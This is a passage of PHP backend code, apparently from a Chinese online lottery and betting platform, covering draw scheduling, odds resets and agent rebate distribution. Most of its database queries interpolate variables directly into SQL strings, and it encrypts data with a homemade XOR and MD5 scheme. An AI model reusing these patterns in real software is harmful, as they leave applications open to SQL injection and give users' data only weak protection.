	'{$valueList['g_up_type']}',
	now(),
	'{$valueList['g_s_id']}',
	'{$ip}',
	'{$ip_s}')";
	$db->query($sql, 2);
}

/**
	 * 加密
	 * @param unknown_type $text
	 * @param unknown_type $key
	 */
	function PasEncode($text, $key)
	{
		srand((double)microtime() * 1000000);
		$encryptKey = md5(rand(0, 32000));
		$ctr = 0;
		$tmp = '';
		
		for ($i=0; $i<mb_strlen($text); $i++)
		{
			$ctr = $ctr == mb_strlen($encryptKey) ? 0 : $ctr;
			$tmp .= $encryptKey[$ctr].($text[$i]^$encryptKey[$ctr++]);
		}
		return base64_encode(PasKey($tmp, $key));
	}
	
	/**
	 * 解密
	 * Enter description here ...
	 * @param unknown_type $text
	 * @param unknown_type $key
	 */
	function PasDecode($text, $key)
	{
		$text = PasKey(base64_decode($text), $key);
		$tmp = '';
		
		for ($i=0; $i<mb_strlen($text); $i++)
		{
			$md5 = $text[$i];
			$tmp .= $text[++$i] ^ $md5;
		}
		return $tmp;
	}
	
	function PasKey($text, $encryptKey)
	{
		$encryptKey = md5($encryptKey);
		$ctr = 0; 
		$tmp  = '';
		
		for ($i=0; $i<mb_strlen($text); $i++)
		{
			$ctr = $ctr == mb_strlen($encryptKey) ? 0 : $ctr;
			$tmp .= $text[$i]^$encryptKey[$ctr++];
		}
		return $tmp;
	}

function gameTypeFormat($type)
{
	$_type = $type;
	switch ($type){
		case 't1' : $_type = '第一球'; break;
		case 't2' : $_type = '第二球'; break;
		case 't3' : $_type = '第三球'; break;
		case 't4' : $_type = '第四球'; break;
		case 't5' : $_type = '第五球'; break;
		case 't6' : $_type = '第六球'; break;
		case 't7' : $_type = '第七球'; break;
		case 't8' : $_type = '第八球'; break;
		case 't9' : $_type = '總和、龍虎'; break;
	}
	return $_type;
}


function gameTypeFormatgx($type)
{
	$_type = $type;
	switch ($type){
		case 't1' : $_type = '第一球'; break;
		case 't2' : $_type = '第二球'; break;
		case 't3' : $_type = '第三球'; break;
		case 't4' : $_type = '第四球'; break;
		case 't5' : $_type = '特码'; break;
		case 't9' : $_type = '總和、龍虎'; break;
	}
	return $_type;
}
/**
 * 加載1-84期開獎與封盤時間
 * 此函數會先刪除后新增。
 * @param $day 加載第幾天的1-84期號碼
 * @param $closeTime 封盤時間
 */
function InsertNumber ($d=1, $closeTime=2)
{
		$db = new DB();
		$db->query("DELETE FROM `g_kaipan` ", 2); 
		$day = date( "Y-m-d 09:10:00",time()+60*60*24*$d ); 
		$count = 0;
		$sql = "INSERT INTO `g_kaipan` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES "; 
		$time=0;
		$times=10;
		for ($i=1; $i<=84; $i++)
		{  
			$t = strtotime($day)+($time*60);
			$time +=$times; 
			$count ++;
			$count = mb_strlen($count) <=1 ? '0'.$count :$count;
			$stratTime = date("Y-m-d H:i:s",$t);
			//$endTime = date("Y-m-d H:i:s", strtotime($stratTime)-($closeTime*60));
			$endTime = date("Y-m-d H:i:s", strtotime($stratTime)-(30));
			$ys = date('Ymd', strtotime($day));
			if (mb_strlen($i) == 1)$n = '0'.$i;else if(mb_strlen($i) == 2) $n = '0'.$i; else $n=$i; 
			$number = $ys.$count; //期數
			$lock = $i == 1 ? 2 : 1;
			$sql .= "( '{$number}', '{$endTime}', '{$stratTime}', '{$lock}' ),";		 
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1); 
		 
		$db->query($sql, 2);
}

function InsertNumber_nc($day, $d, $times, $startNum, $endNum, $closeTime=3)
{
    //$closeTime=2;
	$db = new DB();
	$db->query("DELETE FROM `g_kaipan9` ", 2);
	$d = $d >0 ? $d-1 : $d;
	$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d, date('Y')));
	$sql = "INSERT INTO `g_kaipan9` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=$startNum; $i<=$endNum; $i++)
	{
		$time +=$times;
		$t = strtotime($day)+($time*60);
		$stratTime = date($insertDate." H:i:s",$t);
		//$endTime = date($insertDate." H:i:s", strtotime($stratTime)-($closeTime*60));
		$endTime = date($insertDate." H:i:s", strtotime($stratTime)-(30));
		if($i!=1){
		$ys = date('Ymd', $t-1);
		}else{
		$ys = date('Ymd', $t);
		}
		if (mb_strlen($i) == 1)$n = '0'.$i;else if (mb_strlen($i) == 2)$n = $i;else $n = $i;

		if ($i == 97) {
			$i = 0;
			$endNum = 13;
		}
		if($i==1){
			$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d+1, date('Y')));
			$stratTime = date($insertDate.' 00:02:30');
			$endTime = date($insertDate." H:i:s", strtotime($stratTime)-($closeTime*60));
		}
		$number = $ys.$n; //期數
		$lock = $i == 14 ? 2 : 1;
		$sql .= "( '{$number}', '{$endTime}', '{$stratTime}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	//echo $sql;exit;
	$db->query($sql, 2);
}

function insertNumbers($day, $d, $times, $startNum, $endNum, $closeTime=2)
{
	$db = new DB();
	$db->query("DELETE FROM `g_kaipan2` ", 2);
	$d = $d >0 ? $d-1 : $d;
		//dump($closeTime);
	$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d, date('Y')));
	$sql = "INSERT INTO `g_kaipan2` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=$startNum; $i<=$endNum; $i++)
	{
		$time +=$times;
		//$t = strtotime($day)+($time*60);
		$t = strtotime($day)+($time*60);
		//$stratTime = date($insertDate." H:i:s",$t);
		$stratTime = date($insertDate." H:i:s",$t+00);
		if ($i<=23){$closeTime1=1;}elseif($i>96){$closeTime1=1;}else{$closeTime1=$closeTime;}
		//$endTime = date($insertDate." H:i:s", strtotime($stratTime)-($closeTime1*5));
		//$endTime = date($insertDate." H:i:s", strtotime($stratTime)-60);
		$endTime = date($insertDate." H:i:s", strtotime($stratTime)-30);
		
		$ys = date('Ymd', $t-1);
		if (mb_strlen($i) == 1)$n = '00'.$i;else if (mb_strlen($i) == 2)$n = '0'.$i;else $n = $i;
		if ($i == 96 && Copyright) $times =5;
		if ($i == 120) {
			$i = 0; 
			$endNum = 23;
			$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d+1, date('Y')));
			$stratTime = date($insertDate.' 00:00:00');
		}
		$number = $ys.$n; //期數
		$lock = $i == 24 ? 2 : 1;
		$sql .= "( '{$number}', '{$endTime}', '{$stratTime}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}



//极速时时彩加载开奖  by fushang QQ:1391082827
function insertNumber_jxssc($day=0, $closeTime=1)
{
	global $db;
    $insertDate=date('Y-m-d 06:09:15',($day>=1?time()+24*3600:time()));
	$day=date('Y-m-d',strtotime($insertDate));
	$dateArr = array();
	$baseNumber = 8215527-1152*7-1152*8 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 1152;
	//$baseNumber = 313952-179*15 + (strtotime($day) - strtotime('2012-08-15')) / 86400 * 179;
	for($i=0;$i<1152;$i++)
	{
		$baseNumber++;
		$startDate=($i==0?$insertDate:$insertDate=date('Y-m-d H:i:s',strtotime($insertDate)+75));
		//$endDate=date('Y-m-d H:i:s',strtotime($startDate)-$closeTime*60);
		$endDate=date('Y-m-d H:i:s',strtotime($startDate)-10);
		$dateArr['Number'][] = $baseNumber;
		$dateArr['stratDate'][] = $startDate;
		$dateArr['endDate'][] = $endDate;
	}
	$db->query("DELETE FROM `g_kaipan3` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan3` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}


function insertNumber_xjssc($day=1, $closeTime=2)
{
	$stratDate = date( "Y-m-d 10:10:00", mktime(0, 0, 0, date('m'), date('d')+$day, date('Y')));
	$date = date( "Ymd", mktime(0, 0, 0, date('m'), date('d')+$day, date('Y')));
	$count = 0;
	$dateArr = array();

	for ($i=0; $i<96; $i++)
	{
		$a = strtotime($stratDate) - ($closeTime * 30); //封盤時間
		$endDate = date('Y-m-d H:i:s',$a);
		$dateArr['Number'][] = $date.sprintf("%02d",$i+1);
		$dateArr['stratDate'][] = $stratDate;
		$dateArr['endDate'][] = $endDate;
		$stratDate=date("Y-m-d H:i:s",strtotime($stratDate)+600);
	}
	$db = new DB();
	$db->query("DELETE FROM `g_kaipan10` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan10` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}


//天津时时彩加载开奖  by mj QQ:1391082827
function insertNumber_tjssc($day=1, $closeTime=2)
{
	$stratDate = date( "Y-m-d 09:10:00", mktime(0, 0, 0, date('m'), date('d')+$day, date('Y')));
	$date = date( "Ymd", mktime(0, 0, 0, date('m'), date('d')+$day, date('Y')));
	$count = 0;
	$dateArr = array();

	for ($i=0; $i<84; $i++)
	{
		$a = strtotime($stratDate) - ($closeTime * 30); //封盤時間
		$endDate = date('Y-m-d H:i:s',$a);
		$dateArr['Number'][] = $date.sprintf("%02d",$i+1);
		$dateArr['stratDate'][] = $stratDate;
		$dateArr['endDate'][] = $endDate;
		$stratDate=date("Y-m-d H:i:s",strtotime($stratDate)+600);
	}
	$db = new DB();
	$db->query("DELETE FROM `g_kaipan11` WHERE `g_id` > 0 ", 2);
	$sql = "INSERT INTO `g_kaipan11` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=0; $i<count($dateArr['Number']); $i++)
	{
		$lock = $i == 0 ? 2 : 1;
		$sql .= "( '{$dateArr['Number'][$i]}', '{$dateArr['endDate'][$i]}', '{$dateArr['stratDate'][$i]}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}

//吉林开盘
function insertNumberjs($day, $d, $times, $startNum, $endNum, $closeTime=2)

{
    $db = new DB();
	$db->query("DELETE FROM `g_kaipan7` ", 2);
	$d = $d >0 ? $d-1 : $d;
	$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$d, date('Y')));
	$sql = "INSERT INTO `g_kaipan7` ( `g_qishu`, `g_feng_date`, `g_open_date`, `g_lock` ) VALUES ";
	for ($i=$startNum; $i<=$endNum; $i++)
	{
		$time +=$times;
		$t = strtotime($day)+($time*60);
		$stratTime = date($insertDate." H:i:s",$t);
		//$endTime = date($insertDate." H:i:s", strtotime($stratTime)-($closeTime*60));
		$endTime = date($insertDate." H:i:s", strtotime($stratTime)-30);
		$ys = date('Ymd',strtotime("+$d day") );
		if($i <10) { $n = '00'.$i;}else{$n ='0'.$i;}
		$number1 = $ys.$n;//期數
		$number= mb_substr($number1,2);
		// dump($number);
	    $lock = $i == 1 ? 2 : 1;
		$sql .= "( '{$number}', '{$endTime}', '{$stratTime}', '{$lock}' ),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql, 'utf-8')-1);
	$db->query($sql, 2);
}


function sumMix ($arr)
{
	$n=0;
	foreach ($arr as $value) {
		if ($value !="" && $n >= $value && Copyright)
			$n=$value;
	}
	return $n;
}

/**
 * 還原可用金額
 */
function RestoreMoney ($param)
{
	if ($param == 1)
	{
		$db = new DB();
		$sql = " SELECT `g_name`, `g_money`, `g_money_yes` FROM g_user ";
		$result = $db->query($sql, 1);
		if ($result)
		{
			for ($i=0; $i<count($result); $i++)
			{
				$sql = "UPDATE `g_user` SET `g_money_yes` = '{$result[$i]['g_money']}' WHERE `g_name` = '{$result[$i]['g_name']}' LIMIT 1 ";
				$db->query($sql, 2);
			}
		}
	}
}

/**
 * 還原賠率
 * Enter description here ...
 */
function initializeOdds()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`, `h18`, `h19`, `h20`, `h21`, `h22`, `h23`, `h24`, `h25`, `h26`, `h27`, `h28`, `h29`, `h30`, `h31`, `h32`, `h33`, `h34`, `h35` FROM g_odds_default", 1);
	$sql = "INSERT INTO `g_odds`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`, `h18`, `h19`, `h20`, `h21`, `h22`, `h23`, `h24`, `h25`, `h26`, `h27`, `h28`, `h29`, `h30`, `h31`, `h32`, `h33`, `h34`, `h35`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}
//幸运农场  by mj QQ:1391082827
function initializeOddsnc()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds9 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`, `h18`, `h19`, `h20`, `h21`, `h22`, `h23`, `h24`, `h25`, `h26`, `h27`, `h28`, `h29`, `h30`, `h31`, `h32`, `h33`, `h34`, `h35` FROM g_odds9_default", 1);
	$sql = "INSERT INTO `g_odds9`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`, `h18`, `h19`, `h20`, `h21`, `h22`, `h23`, `h24`, `h25`, `h26`, `h27`, `h28`, `h29`, `h30`, `h31`, `h32`, `h33`, `h34`, `h35`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}


function initializeOddscq()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds2 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14` FROM g_odds2_default", 1);
	$sql = "INSERT INTO `g_odds2`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	//echo $sql;exit;
	$db->query($sql, 2);
}
//极速时时彩  by mj QQ:1391082827
function initializeOddsjxssc()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds3 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14` FROM g_odds3_default", 1);
	$sql = "INSERT INTO `g_odds3`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	//echo $sql;exit;
	$db->query($sql, 2);
}
//新疆时时彩  by mj QQ:1391082827
function initializeOddsxjssc()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds10 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14` FROM g_odds10_default", 1);
	$sql = "INSERT INTO `g_odds10`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}
//天津时时彩  by mj QQ:1391082827
function initializeOddstjssc()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds11 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14` FROM g_odds11_default", 1);
	$sql = "INSERT INTO `g_odds11`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}


function initializeOddsjs()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds7 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15` FROM g_odds7_default", 1);
	$sql = "INSERT INTO `g_odds7`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}

function ipLocation ($ip, $qqWryInfo)
{
	if ($ip == '::1'){
		$add = 'IANA保留地址';
	} else {
		$format = "text";//默认text,json,xml,js
		$charset = "utf8"; //默认utf-8,gbk或gb2312
		$ip_l=new ipLocation($qqWryInfo);
		$address=$ip_l->getaddress($ip);
		$address["area1"] = iconv('GB2312','utf-8',$address["area1"]);
		$address["area2"] = iconv('GB2312','utf-8',$address["area2"]);
		$add=$address["area1"]."·".$address["area2"];
	}
	return $add;
}

function dayMorning($date, $timeval, $p=false)
{
	if ($p == true)
		return date('Y-m-d', strtotime($date) - $timeval);
	else
		return date('Y-m-d', strtotime($date) + $timeval);
}

function t($s_cq){
	$c=array();
	if ($s_cq[1] == 'ah11' || $s_cq[1] == 'ah12')
		$c[0] = '1-5大小';
	else if ($s_cq[1] == 'ah13' || $s_cq[1] == 'ah14')
		$c[0] = '1-5單雙';
	else 
		$c = isBallType($s_cq[0], $s_cq[1], true);
	return $c[0];
}


function tcqsm($s_cq){

	$c=array();
	if ($s_cq[1] == 'ah11' || $s_cq[1] == 'ah12' ||$s_cq[1] == 'bh11' || $s_cq[1] == 'bh12' ||$s_cq[1] == 'ch11' || $s_cq[1] == 'ch12'  ||$s_cq[1] == 'dh11' || $s_cq[1] == 'dh12' ||$s_cq[1] == 'eh11' || $s_cq[1] == 'eh12')
		$c[0] = '1-5大小';
	else if ($s_cq[1] == 'ah13' || $s_cq[1] == 'ah14' ||$s_cq[1] == 'bh13' || $s_cq[1] == 'bh14' ||$s_cq[1] == 'ch13' || $s_cq[1] == 'ch14' ||$s_cq[1] == 'dh13' || $s_cq[1] == 'dh14' ||$s_cq[1] == 'eh13' || $s_cq[1] == 'eh14')
		$c[0] = '1-5單雙';
	else 
		$c = isBallTypecqsm($s_cq[0], $s_cq[1], true);
		
	return $c[0];
}
function tszsm($s_cq){
	$c=array();
	if(preg_match("/^a.*$/",$s_cq[1])){
		$c[0]="三军";
	}else if(preg_match("/^b.*$/",$s_cq[1])){
		$c[0]="大小";
	
	}else if(preg_match("/^c.*$/",$s_cq[1])){
		$c[0]="圍骰全骰";
	
	}else if(preg_match("/^d.*$/",$s_cq[1])){
		$c[0]="點數";
	
	}else if(preg_match("/^e.*$/",$s_cq[1])){
		$c[0]="長牌";
	
	}else if(preg_match("/^f.*$/",$s_cq[1])){
		$c[0]="短牌";
	}
	return $c[0];
	
}
function tkl8sm($s_cq){
	$s="";
	switch($s_cq[0])
	{
		case "Ball_1":
			$s='正碼';
			break;	
		case "Ball_2":
			$s='總和大小';
			break;	
		case "Ball_3":
			$s='總和單雙';
			break;	
		case "Ball_4":
			$s='總和和局';
			break;	
		case "Ball_5":
			$s='總和過關';
			break;	
		case "Ball_6":
			$s='前後和';
			break;	
		case "Ball_7":
			$s='單雙和';
			break;
		case "Ball_8":
			$s='五行';
			break;	
	}
	return $s;
	
}
function tsz($s_cq){
	$c=array();
	if ($s_cq[1] == 'ah11' || $s_cq[1] == 'ah12')
		$c[0] = '1-5大小';
	else if ($s_cq[1] == 'ah13' || $s_cq[1] == 'ah14')
		$c[0] = '1-5單雙';
	else 
		$c = isBallTypecqsz($s_cq[0], $s_cq[1], true);
	return $c[0];
}

/**
 * 退水比
 * Enter description here ...
 * @param Model $user 會員
 * @param String $types 玩法類型
 * @param Int $ball 號碼
 * @param Model $RankUser 上級
 */
function floorMoney ($user, $types, $ball, $RankUser, $p=false,$sz=false,$kl8=false,$k5=false)
{
	$pan = strtolower($user[0]['g_panlu']);
	$g_a_limit = 'g_'.$pan.'_limit';
	if (is_numeric($p)){
		$result = GetRankXianErcq($types, $RankUser[0]['g_name'], $g_a_limit,$p);
	}elseif ($p == true){
		if($kl8)
			$result = GetRankXianErkl8($types, $RankUser[0]['g_name'], $g_a_limit);
		elseif($k5)
			$result = GetRankXianErcq($types, $RankUser[0]['g_name'], $g_a_limit,3);		
		elseif($sz)
			$result=GetRankXianErsz($types, $RankUser[0]['g_name'], $g_a_limit);
		else 
			$result = GetRankXianErcq($types, $RankUser[0]['g_name'], $g_a_limit);
	}else {
		$result = GetRankXianEr($types, $ball, $RankUser[0]['g_name'], $g_a_limit);
	}
	return $result[0][1];
}

function floorMoneygx ($user, $types, $ball, $RankUser, $p=false)
{
	$pan = strtolower($user[0]['g_panlu']);
	$g_a_limit = 'g_'.$pan.'_limit';
	if ($p == true){
		$result = GetRankXianErcq($types, $RankUser[0]['g_name'], $g_a_limit);
	}else {
		$result = GetRankXianErgx($types, $ball, $RankUser[0]['g_name'], $g_a_limit);
	}
	return $result[0][1];
}



function RankUser ($db, $likeNid)
{
	return $db->query("SELECT * FROM `g_rank` WHERE g_nid = '{$likeNid}' LIMIT 1", 1);
}

/**
 * 計算代理-公司退水、占成分配
 * @param unknown_type $user 用戶
 * @param unknown_type $money 下注金額
 * @param unknown_type $ball 號碼
 * @param unknown_type $types 類型
 */
function SumRankDistribution ($user, $money, $ball, $types, $p=false,$sz=false,$kl8=false,$k5=false)
{
	$DtnArray = array('tueishui_1'=>0, 'tueishui_2'=>0, 'tueishui_3'=>0, 'tueishui_4'=>0, 'distribution_1'=>0, 'distribution_2'=>0, 'distribution_3'=>0, 'distribution_4'=>0);
	$db = new DB();
	//得到直屬上級
	$RankUser = RankUser($db, $user[0]['g_nid']);
	//echo $user[0]['g_mumber_type'].'<br>';
	if ($user[0]['g_mumber_type'] == 2)
	{
		$nid = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $nid);
		//判斷屬於什麽級別的直屬會員

		switch ($RankUser[0]['g_login_id'])
		{
			case 56: //分直屬
				$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_4'] = $floorMoney; //分公司退水
				$DtnArray['tueishui_3'] = $floorMoney;
				$DtnArray['distribution_4'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =$RankUser[0]['g_distribution_limit']; //公司占成
				}				
			break;
			case 22: //股東直屬
				$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_4'] = $floorMoney; //總代理退
				$DtnArray['tueishui_3'] = $floorMoney; //股東退水
				$DtnArray['tueishui_2'] = $floorMoney; //股東退水
				$DtnArray['distribution_3'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']) - $DtnArray['distribution_3']; //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_4'] = $floorMoney; //公司退水
			break;
			case 78: //總代理直屬
				//退水百分比
				$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_4'] = $floorMoney; //總代理退
				$DtnArray['tueishui_3'] = $floorMoney; //總代理退
				$DtnArray['tueishui_2'] = $floorMoney; //總代理退水
				$DtnArray['tueishui_1'] = $floorMoney; //總代理退水
				$DtnArray['distribution_2'] = $user[0]['g_distribution']; //總代理占成
				$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
				
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoney ($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_3'] = $floorMoney; //股東退水
				if($RankUser[0]['g_zcgs']==0){
				$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
				$DtnArray['distribution_4'] = 100 - ($DtnArray['distribution_3'] + $DtnArray['distribution_2']+$g_distri); //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-64);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoney ($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
				$DtnArray['tueishui_4'] = $floorMoney; //公司退水
			break;
		}
	}
	else 
	{
		//退水百分比
		$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
		$DtnArray['tueishui_1'] = $floorMoney; //代理退水
		$DtnArray['distribution_1'] = $user[0]['g_distribution']; //代理占成
		$DtnArray['distribution_2'] = $RankUser[0]['g_distribution_limit']; //總代理占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
		$DtnArray['tueishui_2'] = $floorMoney; //總代理退水
		$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-64);
		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
		$DtnArray['tueishui_3'] = $floorMoney; //股東退水
		if($RankUser[0]['g_zcgs']==0){
		$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
		$DtnArray['distribution_4'] =100 - ($DtnArray['distribution_1'] + $DtnArray['distribution_2'] + $DtnArray['distribution_3']+$g_distri); //公司占成
		}else{
		$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
		}
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-96);
